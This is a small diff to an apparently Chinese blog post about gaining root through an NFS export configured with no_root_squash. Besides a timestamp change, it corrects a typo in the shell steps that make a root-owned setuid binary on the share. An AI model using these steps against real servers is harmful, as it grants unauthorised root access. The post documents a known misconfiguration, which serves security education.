@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-<!-- 2023-05-06 Sat 10:09 -->
+<!-- 2023-06-06 Tue 15:45 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>利用nfs no_root_squash获取root权限</title>
@@ -186,7 +186,7 @@ nfs服务器配置时,很多人并不注意其中的安全选项，直接写上n
 <div class="org-src-container">
 <pre class="src src-bash"><code><span class="org-builtin">cd</span> aaa</code>
 <code>gcc test.c -o test.bin</code>
-<code>sudo chmod root:root test.bin</code>
+<code>sudo chown root:root test.bin</code>
 <code>sudo chmod u+s test.bin</code>
 <code>ls -al test.bin</code>
 <code>-rwsr-xr-x 1 root root 16744  8&#26376;  8 16:33 test.bin</code>
